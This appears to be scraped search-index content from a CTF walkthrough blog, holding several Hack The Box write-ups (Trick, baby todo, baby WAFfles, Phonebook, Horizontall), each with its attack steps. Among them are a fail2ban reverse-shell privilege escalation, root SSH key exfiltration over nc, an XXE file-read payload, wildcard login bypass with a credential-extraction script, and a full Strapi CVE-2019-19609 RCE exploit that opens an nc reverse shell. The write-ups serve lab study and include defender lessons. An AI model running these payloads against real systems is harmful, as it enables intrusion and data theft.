[DEFAULT] # # MISCELLANEOUS OPTIONS # # &#34;ignorself&#34; specifies whether the local resp. own IP addresses should be ignored # (default is true). Fail2ban will not ban a host which matches such addresses. #ignorself = true # &#34;ignoreip&#34; can be a list of IP addresses, CIDR masks or DNS hosts. Fail2ban # will not ban a host which matches an address in this list. Several addresses # can be defined using space (and/or comma) separator. #ignoreip = 127.0.0.1/8 ::1 # External command that will take an tagged arguments to ignore, e.g. &lt;ip&gt;, # and return true if the IP is to be ignored. False otherwise. # # ignorecommand = /path/to/command &lt;ip&gt; ignorecommand = # &#34;bantime&#34; is the number of seconds that a host is banned. bantime = 10s # A host is banned if it has generated &#34;maxretry&#34; during the last &#34;findtime&#34; # seconds. findtime = 10s # &#34;maxretry&#34; is the number of failures before a host get banned. maxretry = 5 [...some stuff...] # # Action shortcuts. To be used to define action parameter # Default banning action (e.g. iptables, iptables-new, # iptables-multiport, shorewall, etc) It is used to define # action_* variables. Can be overridden globally or per # section within jail.local file banaction = iptables-multiport banaction_allports = iptables-allports Ok, so maybe instead of a custom action, I should be using /etc/fail2ban/action.d/iptables-multiport.conf
First, I tried simply putting my reverse shell inside the actionstart and actionstop sections of the .conf file:
![fail2ban conf edited](fail2ban conf edited.png)
Then I restarted the service:
sudo /etc/init.d/fail2ban restart but&hellip; still no reverse shell 😕
Next, I tried putting my reverse shell inside of the unban action instead. But now I need to find a way to get banned. As seen previously in jail.conf, I will be banned by performing 5 failed authentication attempts in a 10 second span. That&rsquo;s tricky, actually I think that&rsquo;s impossible if trying to log in the naive way. Instead, I tried make at least 5 login attempts at once using a python script:
!/usr/bin/python3 from subprocess import Popen, PIPE def attempt_login(): proc = Popen([&#39;ssh&#39;, &#34;root@trick.htb&#34;], stdin = PIPE) proc.stdin.write(b&#39;not_a_password&#39;) proc.stdin.flush() for i in range(10): attempt_login() So the plan of attack is as follows, and it has to be very quick:
modify /etc/fail2ban/action.d/iptables-multiport.conf to have a ban action set to my reverse shell, instead of the default ban action
As michael, perform /etc/init.d/fail2ban restart to enact the changes to fail2ban configuration
From my attacker machine, make a bunch of failed login attempts as fast as possible using my python script
🙏 pray for reverse shell
If I get it, quickly grab the flag. I need to be faster than the anacron job that overwrites /etc/fail2ban.
Performing the above steps worked perfectly! 🎉 root shell acquired!
&hellip; for like 5 whole seconds. Then the connection was terminated 😞
So to get a persistent root shell, I repeated the above steps. This time quickly copying-over root&rsquo;s ssh key into a place michael can access:
![nabbed root ssh key](nabbed root ssh key.png)
Super, let&rsquo;s try transferring that file over and logging in now.
At this point, I realized I forgot to change the file owner! So even though michael can see the key, they cant access it. I performed the attack again, getting a new reverse shell, this time changing the file owner:
chown michael:michael /home/michael/id_rsa.root Then I transferred the file using nc:
(on the attacker box)
nc -lvnp 4444 &gt; root_id_rsa (as michael)
nc -nv 10.10.14.5 4444 &lt; id_rsa.root Then on my attacker machine I changed the key&rsquo;s permissions with chmod 700 root_id_rsa and logged in:
![root shell over ssh](root shell over ssh.png)
YES! Finally a nice solid ssh connection as root🎉
LESSONS LEARNED Attacker Take good notes; think critically about what you wrote down. It may sound obvious, but this is the #1 way I&rsquo;ve wasted time on HTB boxes: by accidentally passing over some small piece of information that I had already discovered, and forgetting to go back and check it. For this box, I almost missed enumerating the VHost that created a foothold.
Re-enumerate when you find a new piece of the attack surface. It&rsquo;s easy to fall into the trap of thinking of enumeration as one big contiguous step - this is not the case at all. Whenever you discover a new domain, a new service, a new user, or a new API, it is essential to fully enumerate the thing you found. Keeping a methodical mindset will save lots of time in the long run.
Recognize when users or services seem out-of-place. Even a print service can have a juicy exploit. This technique mostly comes with experience, but it is also good to have a &ldquo;normal&rdquo; computer around to compare the target to, to establish a bit of a baseline.
Privilege escalation takes creativity. Sometimes, the trick to privesc is trying to think of the weirdest way to use what&rsquo;s in front of you. If you abstract the tools/services you have available into their functional components, sometimes you can think of a good way to string them together into privilege escalation. In this case, it came down to finding a way to get myself banned with Fail2Ban to execute some commands that I myself had planted: so weird! But when you take a step back, it&rsquo;s not so odd:
&ndash; Fail2Ban can execute code when banning a user.
&ndash; I can determine arbitrary code that runs Fail2Ban executes.
&ndash; I can find a way to ban myself.
​ ==&gt; By hypothetical syllogism, I can execute arbitrary code.
Defender Printer driver updates are actually useful - who knew? An administrator isn&rsquo;t necessarily a security expert: they should opt to defer their judgement to the vendor that produces Internal users shouldn&rsquo;t be trusted universally. It was clear that Fail2Ban was meant to be used for external login attempts, but a more clever system of permissions or capabilities could have kept michael from abusing Fail2Ban. Clean up after yourself. The vulnerabilities for this box were all found on pre-production vhosts. These vhosts should not have been exposed to the internet: at most, they should have been exposed to an internal port. This is as simple as updating a couple of DNS records, but is easy to accidentally overlook. Prevent directory traversals on the webserver. They are always preventable. There are many ways to do this, including the server configuration files and WAFs. Find something that works for your situation and apply it. Keep on top of your updates. Both HPLIP and Fail2Ban had vulnerabilities disclosed in CVEs, that had since been patched. Using a stronger update policy could have prevented both services from being attacked. `,url:"https://4wayhandshake.github.io/walkthrough/trick/"},"https://4wayhandshake.github.io/ctf/baby-todo-or-not-todo/":{title:"baby todo or not todo",tags:["SQL","Broken API"],categories:["Challenge","HTB","Web","Easy"],content:"INTRODUCTION This challenge is a docker container, coming packaged with a zip of all of the whole docker container (it&rsquo;s a &ldquo;white box&rdquo; challenge.)\nOpen up the source code and read through it, get a sense of how the app is supposed to work. The name of the folder indicates &ldquo;broken authentication control&rdquo;, so that&rsquo;s probably where this is headed.\nFIRST TAKE The db file schema.sql is the first file to read. I find it&rsquo;s easiest to get a handle on how an app works if you can see how the data is stored. The schema reveals what we should find once we do open the database. Once the website is running, the flag will be present in the table todos (in the name field) with assignee = admin\nDROP TABLE IF EXISTS `users`; DROP TABLE IF EXISTS `todos`; CREATE TABLE `users` ( `id` INTEGER PRIMARY KEY AUTOINCREMENT, `name` TEXT NOT NULL, `secret` TEXT NOT NULL ); INSERT INTO `users` (`name`, `secret`) VALUES (&#39;admin&#39;, &#39;%s&#39;); CREATE TABLE `todos` ( `id` INTEGER PRIMARY KEY AUTOINCREMENT, `name` TEXT NOT NULL, `done` INTEGER NOT NULL, `assignee` TEXT NOT NULL ); INSERT INTO `todos` (`name`, `done`, `assignee`) VALUES (&#39;HTB{f4k3_fl4g_f0r_t3st1ng}&#39;, 0, &#39;admin&#39;); This gives us an idea of what the final step of the challenge might be.\nEven after ready only app.py, it is clear that the app uses session data to identify the user. There is a username, and a secret; the server checks consistency between these and returns the to-do items accordingly.\nSTRAIGHT TO THE FLAG There is one snippet in the source code that, when you read it, you will realize all of that reading was for nothing. Inside routes.py there is a hint:\n... # TODO: There are not view arguments involved, I hope this doesn&#39;t break # the authentication control on the verify_integrity() decorator @api.route(&#39;/list/all/&#39;) def list_all(): return jsonify(todo.get_all()) ... So there is one route that just dumps the database without checking what user requested it? Nice.\nI ran the website&rsquo;s docker container, then caught (in Burp) the first request my browser performed. This is a GET that loads all of the current to-do items. It is trivial to change out the endpoint /list/user12345678 to /list/all, while retaining the secret and cookie:\nGET /api/list/all/?secret=C038417EFc3A24D HTTP/1.1 Host: 139.59.183.98:32015 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://139.59.183.98:32015/ Connection: close Cookie: session=eyJhdXRoZW50aWNhdGlvbiI6InVzZXIzMTgzYjgwZCJ9.YWDKPQ.jkmXBByrr67jX8-sD2tEUpRKLzw As described in routes.py, the response is a dump of the whole database.\nHTTP/1.0 200 OK Content-Type: application/json Content-Length: 687 Server: made with &lt;3 by makelarides Vary: Cookie Date: Fri, 08 Oct 2021 23:05:54 GMT [{&#34;assignee&#34;:&#34;admin&#34;,&#34;done&#34;:false,&#34;id&#34;:1,&#34;name&#34;:&#34;how are you seeing this???&#34;},{&#34;assignee&#34;:&#34;admin&#34;,&#34;done&#34;:true,&#34;id&#34;:2,&#34;name&#34;:&#34;give makelaris and jr a kiss &lt;3&#34;},{&#34;assignee&#34;:&#34;admin&#34;,&#34;done&#34;:false,&#34;id&#34;:3,&#34;name&#34;:&#34;do homework&#34;},{&#34;assignee&#34;:&#34;admin&#34;,&#34;done&#34;:false,&#34;id&#34;:4,&#34;name&#34;:&#34;take groceries&#34;},{&#34;assignee&#34;:&#34;admin&#34;,&#34;done&#34;:true,&#34;id&#34;:5,&#34;name&#34;:&#34;world Domination&#34;},{&#34;assignee&#34;:&#34;admin&#34;,&#34;done&#34;:false,&#34;id&#34;:6,&#34;name&#34;:&#34;HTB{l3ss_ch0r3s_m0r3_h4ck1ng...right?!!1}&#34;},{&#34;assignee&#34;:&#34;admin&#34;,&#34;done&#34;:false,&#34;id&#34;:7,&#34;name&#34;:&#34;test&#34;},{&#34;assignee&#34;:&#34;user3183b80d&#34;,&#34;done&#34;:false,&#34;id&#34;:8,&#34;name&#34;:&#34;hack&#34;},{&#34;assignee&#34;:&#34;user3183b80d&#34;,&#34;done&#34;:false,&#34;id&#34;:9,&#34;name&#34;:&#34;eat&#34;},{&#34;assignee&#34;:&#34;user3183b80d&#34;,&#34;done&#34;:false,&#34;id&#34;:10,&#34;name&#34;:&#34;sleep&#34;}] Well how about that; we didn&rsquo;t even need to log in as admin ;)\n",url:"https://4wayhandshake.github.io/ctf/baby-todo-or-not-todo/"},"https://4wayhandshake.github.io/ctf/baby-waffles-order/":{title:"baby WAFfles order",tags:["SQL","Broken API"],categories:["Challenge","HTB","Web","Easy"],content:`FIRST TAKE Download the challenge files: it is a docker, showing you the source code for the whole challenge.
Obvious hint: the title of the website is xxe
Read all the source code, understand how the web app works. In essence, the challenge is an order-taking API for a fictional restaurant, taking orders for either Ice Scream or WAFfles. Orders may be submitted to /api/order as:
application/json application/xml CONVERTING REQUEST TO XML It appears that the website is configured to submit orders as json, but the endpoint will still accept xml. Try running the docker and interacting with it: submit an order and catch the request in Burp. The POST will have content-type application/json, but go ahead and convert it to the equivalent XML request:
Change the request Content-Type, Content-Length, and body to match:
POST /api/order HTTP/1.1 Host: 68.183.41.74:31284 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://68.183.41.74:31284/ Content-Type: application/xml Origin: http://68.183.41.74:31284 Content-Length: 97 Connection: close Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImZha2VuYW1lIn0%3D &lt;?xml version=&#39;1.0&#39;?&gt; &lt;foo&gt; &lt;table_num&gt;&#34;3&#34;&lt;/table_num&gt; &lt;food&gt;&#34;Ice Scream&#34;&lt;/food&gt; &lt;/foo&gt; Submitting the above request shows the app is listening for XML.
ADAPTING TO XXE The site is called xxe, so let&rsquo;s try the most basic xxe based on the above request. We already know two things:
The path to the flag (since we were given the source code) The flag should reside in the root folder: /flag The parameter in the message body that will be reflected to the client The food is reflected when the order is confirmed So we should read the file /flag and inject into food so we can see it directly.
POST /api/order HTTP/1.1 Host: 68.183.41.74:31284 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://68.183.41.74:31284/ Content-Type: application/xml Origin: http://68.183.41.74:31284 Content-Length: 206 Connection: close Cookie: PHPSESSID=eyJ1c2VybmFtZSI6ImZha2VuYW1lIn0%3D &lt;?xml version=&#39;1.0&#39;?&gt; &lt;!DOCTYPE anything [ &lt;!ELEMENT anything ANY&gt; &lt;!ENTITY file SYSTEM &#34;file:///flag&#34;&gt; ]&gt; &lt;anything&gt; &lt;table_num&gt;&#34;3&#34;&lt;/table_num&gt; &lt;food&gt; &#34;Ice Scream&#34; &amp;file; &lt;/food&gt; &lt;/anything&gt; Submitting the above request will produce the flag:
`,url:"https://4wayhandshake.github.io/ctf/baby-waffles-order/"},"https://4wayhandshake.github.io/ctf/phonebook/":{title:"Phonebook",tags:["XSS","Form Fuzzing","Broken Authentication"],categories:["Challenge","HTB","Web","Easy"],content:`INTRODUCTION At the time of writing this walkthrough, Phonebook is currently active (Oct 2021) and worth 30 points.
FIRST TAKE I started up the challenge and visited the website. It is a small login form.
Looks pretty typical. Checking the source code for another look reveals a conspicuous little script:
&lt;script&gt; const queryString = window.location.search; if (queryString) { const urlParams = new URLSearchParams(queryString); const message = urlParams.get(&#39;message&#39;); if (message) { document.getElementById(&#34;message&#34;).innerHTML = message; document.getElementById(&#34;message&#34;).style.visibility = &#34;visible&#34;; } } &lt;/script&gt; What could be the point of this? I tried navigating to http://139.59.183.98:31487/login?message=What%20can%20go%20here. Lo and behold:
Ok, that is interesting. So the site might be vulnerable to XSS. However, this does not provide us a way in (We&rsquo;re in a docker container: there are no other users, so nobody to target for XSS). I might come back and play with this a bit.
LOGIN FORM There is clearly a hint right on the form
&ldquo;You can now login using the workstation username and password! - Reese&rdquo;.
&hellip;maybe the workstation username is some kind of mangling of reese or phonebook then?
admin : admin reese : reese phonebook : phonebook Best not to get too specific right up front. Let&rsquo;s try some low-hanging fruit for auth bypass first. One of the first things any tester should do is attempt the most basic sql injections, just to see if it is worth pursuing. I tried the singlequote, doublequote, and an backslash-escaped version of each. Got a 500 Internal Server Error (a very good sign that SQLi may be possible) from the following:
SQLi may be possible, so next I tried the
admin&rsquo; or &lsquo;1&rsquo;=&lsquo;1 : pass admin&rsquo;)&ndash; - : pass admin&rsquo; or 1=1 &ndash; : pass No luck!
Lets do the above, but much deeper, using sqlmap:
sqlmap -u http://159.65.59.85:31911 --forms --crawl=2
This returned no results, even though it seemed like it was working properly. I also tried modifying the POST data to include the usernames admin, reese, and phonebook (instead of guessing values on both parameters), and still no luck.
At this point I started wondering why I was having no result. Was it because of the string escaping? The singlequote only worked once it was backslash escaped, so perhaps the SQLi strings need proper escaping? Let&rsquo;s try the SQLi again, but this time with strings that we have ensured are urlencoded.
URL-ENCODED LOGIN FORM FUZZING Kali comes prepackaged with a wordlist suitable for fuzzing auth forms: /usr/share/wordlists/wfuzz/Injections/All_attack.txt.
WLIST=/usr/share/wordlists/wfuzz/Injections/All_attack.txt
ffuf -w $WLIST:FUZZ -u http://$RADDR/login -X POST -d 'username=FUZZ&amp;password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -t 80 -c -o ffuf-output -of html -fc 307
As expected, this yields nothing.
Let&rsquo;s try URL-encoding the whole wordlist
cat $WLIST | perl -MURI::Escape -ne 'chomp;print uri_escape($_),&quot;\\n&quot;' &gt; ./urlencoded_wordlist.txt
ENCLIST=./urlencoded_wordlist.txt
ffuf -w $ENCLIST:FUZZ -u http://$RADDR/login -X POST -d 'username=FUZZ&amp;password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -t 80 -c -o ffuf-output -of html -fc 307
That is a LOT of results.
After running the above with a verbose flag, I realized that all of the unsuccessful requests have the string &ldquo;Authentication failed&rdquo;, so I filtered out that string from the result (filter the substring &ldquo;fail&rdquo;):
ffuf -w $ENCLIST:FUZZ -u http://$RADDR/login -X POST -d 'username=FUZZ&amp;password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -t 80 -c -o ffuf-output -of html -fc 307 -v -fr fail
/'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ​ ​ :: Method : POST ​ :: URL : http://159.65.59.85:31498/login ​ :: Wordlist : FUZZ: ./urlencoded_wordlist.txt ​ :: Header : Content-Type: application/x-www-form-urlencoded ​ :: Data : username=FUZZ&amp;password=FUZZ ​ :: Output file : ffuf-output ​ :: File format : html ​ :: Follow redirects : false ​ :: Calibration : false ​ :: Timeout : 10 ​ :: Threads : 80 ​ :: Matcher : Response status: 200,204,301,302,307,401,403,405 ​ :: Filter : Response status: 307 ​ :: Filter : Regexp: fail
________________________________________________ [Status: 302, Size: 0, Words: 1, Lines: 1] | URL | http://159.65.59.85:31498/login | --&gt; | / * FUZZ: %2A [Status: 302, Size: 0, Words: 1, Lines: 1] | URL | http://159.65.59.85:31498/login | --&gt; | /login?message=Authentication%20Failed * FUZZ: Well that looks pretty definitive! We simply use %2A for both the username and password. This is the wildcard character (*).
Success! We have bypassed the login and are in a phonebook app.
PHONEBOOK APP The source code reveals that the search bar is the only intended functionality.
function failure() { var content = &#39;&lt;p class=&#34;lead&#34;&gt;No search results.&lt;/p&gt;&#39;; $(&#39;#maindiv&#39;).append(content); }; function success(data) { $(&#34;#maindiv&#34;).empty(); if (data.length == 0) { failure(); return; }; var content = &#34;&lt;table&gt;&#34;; data.forEach(function(item) { content += &#39;&lt;tr&gt;&lt;td&gt;&#39; + item[&#34;cn&#34;] + &#34; &#34; + item[&#34;sn&#34;] + &#39;&lt;/td&gt;&lt;td&gt;&#39;+ item[&#34;mail&#34;] +&#39;&lt;/td&gt;&lt;td&gt;&#39;+ item[&#34;homePhone&#34;] +&#39;&lt;/td&gt;&lt;/tr&gt;&#39;; console.log(item); }); content += &#34;&lt;/table&gt;&#34;; $(&#39;#maindiv&#39;).append(content); }; function search(form) { var searchObject = new Object(); searchObject.term = $(&#34;#searchfield&#34;).val(); $.ajax({ type: &#34;POST&#34;, url: &#34;/search&#34;, data: JSON.stringify(searchObject), success: success, dataType: &#34;json&#34;, }); }; Switched over to Burpsuite to try different POSTs to the search endpoint
Note that it accepted the singlequote here as text. We can once again backslash-escape the quote for interesting results
&quot;\\'&quot; ==&gt; &quot;error&quot;:&quot;invalid character '\\\\'' in string escape code&quot;
&quot;\\\\'&quot; ==&gt; &quot;error&quot;:&quot;Unexpected EOF&quot;
Unexpected EOF? That probably means we properly injected. I copied the above request into a new file PostRequest.txt, changed the value of &ldquo;term&rdquo; (&ldquo;term&rdquo;:&ldquo;a&rdquo;) to something that would yield a 200 status, then tried sqlmap:
sqlmap -r PostRequest.txt
And, after much probing&hellip; sqlmap gave no actionable result.
There is still a piece of information that we&rsquo;ve gathered but have not tried: why not try regexp stuff through the search field? It worked on the login page, so maybe it will work here too. A quick search for various terms with an asterisk yield exactly what we would expect: it treats it like * in regexp. Ex a search for &ldquo;*skynet&rdquo; gives only reese@skynet.com.
Having no success in abusing the Phonebook search, I went back to the login form to see what else was possible.
Login Form The login form accepted the wildcard character credential * : *. But is that all it will accept? If the ***** is acting that way, we should be able to use the login form to check for any valid credentials. I.e we can check a sequence like the following, and finally fail on the last attempt.
F*
FU*
FUL*
&hellip;
FULLUSERNAME*
So by guessing and checking longer and longer substrings, we can find a valid credential. A bunch of matches followed by one mismatch would indicate the username is valid.
I performed the auth bypass using * : *, and caught the request in Burp proxy. Burp allows you to convert an arbitrary request into a cURL command by right-clicking the POST. While this probably could have been done using some bash scripting and cURL, I am more comfortable in Python.
Check out this wonderful website that does the conversion of cURL to Python Requests: https://curl.trillworks.com/#python
To extract the first matching username, I wrote this script (based on the above Requests snippet):
#!/bin/python3 import requests matchCodes = [200,302] filterLocation = [&#39;ailed&#39;] alphabet = [c for c in &#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.&#34;] maxLength = 40 headers = { &#39;Host&#39;: &#39;68.183.41.74:31495&#39;, &#39;User-Agent&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#39;, &#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;, &#39;Accept-Language&#39;: &#39;en-US,en;q=0.5&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;, &#39;Content-Length&#39;: &#39;21&#39;, &#39;Origin&#39;: &#39;http://68.183.41.74:31495&#39;, &#39;Connection&#39;: &#39;close&#39;, &#39;Referer&#39;: &#39;http://68.183.41.74:31495/login&#39;, &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;, } longstrings = [] def longestChildren(s): data = f&#39;username={s}*&amp;password=*&#39; response = requests.post(&#39;http://68.183.41.74:31495/login&#39;, headers=headers, data=data, allow_redirects=False) # If this POST was unsuccessful, then this is not a valid substring. if (len(s) &gt;= maxLength or response.status_code not in matchCodes): return # If the response contains any of the filter text, reject it for badStr in filterLocation: if response.headers[&#39;Location&#39;].find(badStr) &gt;= 0: return print(f&#34;Found: {s}&#34;) if s[:-1] in longstrings: longstrings.remove(s[:-1]) longstrings.append(s) for c in alphabet: longestChildren(s+c) print(&#39;----------------------------------&#39;) longestChildren(&#39;&#39;) print(&#34;Completed. Matching substrings: &#34;) for s in longstrings: print(s) Running the above script, the results should start rolling in&hellip;
Nice, we had expected to find Reese as a user, this confirms it.
Modify the above script: expand the alphabet (passwords can have a more characters, special characters, etc), and change which fields are used in the request
alphabet = [c for c in &#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^()_+}{&#34;] ... data = f&#39;username=REESE&amp;password={s}*&#39; Run the modified script to extract the password (I have not shown the whole execution):
Excellent! Reese&rsquo;s password is clearly the HTB flag itself. By getting the rest the password, you will find the flag.
Lessons Learned Consider escaping your go-to list of basic SQLi.
If you can figure out what the escape character is, this should be trivial.
When you bypass auth, go back and find a real credential.
Or at least remember to go back and find a credential once you have exhausted options that require a credential
Spend your time writing enumeration scripts, instead of trying unlikely options.
It gets easier every time. Remember there are lots of tools to automate.
`,url:"https://4wayhandshake.github.io/ctf/phonebook/"},"https://4wayhandshake.github.io/walkthrough/horizontall/":{title:"Horizontall (images only)",tags:["Laravel"],categories:["Walkthrough","HTB","Linux","Easy"],content:`Introduction This walkthrough is just a series of screenshots showing how I got through the box. 🤷‍♂ I did this box before I really worked out a process for recording my work effectively. Sorry!
If I find the time, I&rsquo;ll come back to this and try to document it properly.
Walkthrough These are the notes I left for myself:
Found login page at http://api-prod.horizontall.htb/admin/auth/login I could brute-force the login just with ffuf Or I could try using the OpenSSH user enumeration CVE to obtain a list of users first? The successful exploit was from https://github.com/dasithsv/CVE-2019-19609 I simply modified the port, (opened the firewall), set up a nc listener and got a shell rhost was api-prod.horizontall.htb lhost was 10.10.14.45 jwt was simply the jwt from my logged-in admin session (got it from firefox web dev tools) url was http://api-prod.horizontall.htb/ This is the exploit I used:
#!/bin/python # Product: Strapi Framework # Version Affected: strapi-3.0.0-beta.17.7 and earlier # Fix PR: https://github.com/strapi/strapi/pull/4636 # NPM Advisory: https://www.npmjs.com/advisories/1424 # more information https://bittherapy.net/post/strapi-framework-remote-code-execution/ import requests import sys print(&#34;\\n\\n\\nStrapi Framework Vulnerable to Remote Code Execution - CVE-2019-19609&#34;) print(&#34;please set up a listener on port 31337 before running the script. you will get a shell to that listener\\n&#34;) if len(sys.argv) ==5: rhost = sys.argv[1] lhost = sys.argv[2] jwt = sys.argv[3] url = sys.argv[4]+&#39;admin/plugins/install&#39; headers = { &#39;Host&#39;: rhost, &#39;Authorization&#39;: &#39;Bearer &#39;+jwt, &#39;Content-Type&#39;: &#39;application/json&#39;, &#39;Content-Length&#39;: &#39;131&#39;, &#39;Connection&#39;: &#39;close&#39;, } data = &#39;{ &#34;plugin&#34;:&#34;documentation &amp;&amp; $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &#39;+lhost+&#39; 31337 &gt;/tmp/f)&#34;, &#34;port&#34;:&#34;80&#34; }&#39; response = requests.post(url, headers=headers, data=data, verify=False) else: print(&#39;python3 exploit.py &lt;rhost&gt; &lt;lhost&gt; &lt;jwt&gt; &lt;url&gt;&#39;) `,url:"https://4wayhandshake.github.io/walkthrough/horizontall/"}}</script><script src=/scripts/lunr.min.js></script><script src=/scripts/search.js></script><div class=footer__inner><span>4wayhandshake - CTF Walkthroughs, Tips & Tricks</span></div><div class=footer__inner><span>&copy;2025</span>&nbsp;
<span><a href=https://timsullivan.online></a></span>&nbsp;
<span><a href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank rel=noopener>CC BY-NC 4.0</a></span></div><div class=footer__inner></div></footer></div><script type=text/javascript src=/bundle.min.fcd9efc9aa34f0cbcc7e7ff819df6a986703ae0600c67c50d1f2bc0825baa71fe151755c46f76ccbf1b1668d03c115c05e53d5902c97341281392858706c869c.js integrity="sha512-/Nnvyao08MvMfn/4Gd9qmGcDrgYAxnxQ0fK8CCW6px/hUXVcRvdsy/GxZo0DwRXAXlPVkCyXNBKBOShYcGyGnA=="></script><script src=/scripts/main.js></script></body></html>